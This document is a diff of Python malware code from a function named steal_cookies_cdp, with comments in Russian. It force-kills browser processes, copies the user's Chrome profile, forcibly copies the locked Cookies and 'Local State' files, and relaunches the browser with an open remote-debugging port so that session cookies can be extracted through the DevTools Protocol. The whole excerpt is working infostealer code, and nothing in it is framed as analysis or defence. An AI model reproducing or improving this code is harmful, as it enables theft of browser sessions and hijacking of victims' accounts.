@@ -130,12 +130,10 @@ def steal_cookies_cdp(browser_name, port, user_data_dir):
         return False
     exe_name = os.path.basename(exe_path)
 
-    # убиваем все процессы браузера + crash handler
     for name in (exe_name, "GoogleCrashHandler.exe", "GoogleCrashHandler64.exe", "chrome_proxy.exe"):
         subprocess.run(["taskkill", "/IM", name, "/F"], capture_output=True, timeout=10)
     time.sleep(4)
 
-    # порт занят? сдвигаем
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(1)
@@ -150,6 +148,7 @@ def steal_cookies_cdp(browser_name, port, user_data_dir):
     if cdp_profile.exists():
         shutil.rmtree(cdp_profile, ignore_errors=True)
 
+    # 1. robocopy
     try:
         r = subprocess.run(
             ["robocopy", str(user_data_dir), str(cdp_profile),
@@ -166,11 +165,33 @@ def steal_cookies_cdp(browser_name, port, user_data_dir):
         print(f"[CDP {browser_name}] profile copy failed (no Local State)")
         return False
 
+    # 2. ФОРС-КОПИРОВАНИЕ залоченных файлов через copy_shared
+    src_def = user_data_dir / "Default"
+    dst_def = cdp_profile / "Default"
+    dst_def.mkdir(parents=True, exist_ok=True)
+    
+    src_ls = user_data_dir / "Local State"
+    dst_ls = cdp_profile / "Local State"
+    if src_ls.exists():
+        copy_shared(src_ls, dst_ls)
+
+    for ck in ("Network/Cookies", "Cookies"):
+        src_ck = src_def / ck
+        if src_ck.exists():
+            dst_ck = dst_def / ck
+            dst_ck.parent.mkdir(parents=True, exist_ok=True)
+            if copy_shared(src_ck, dst_ck):
+                print(f"[CDP {browser_name}] forced copy {ck} -> {dst_ck.stat().st_size} bytes")
+            else:
+                print(f"[CDP {browser_name}] failed to force copy {ck}")
+
+    # 3. Запуск с --profile-directory
     args = [
         exe_path,
         f"--remote-debugging-port={port}",
         "--remote-allow-origins=*",
         f"--user-data-dir={cdp_profile}",
+        "--profile-directory=Default",
         "--no-first-run",
         "--no-default-browser-check",
         "--disable-gpu",
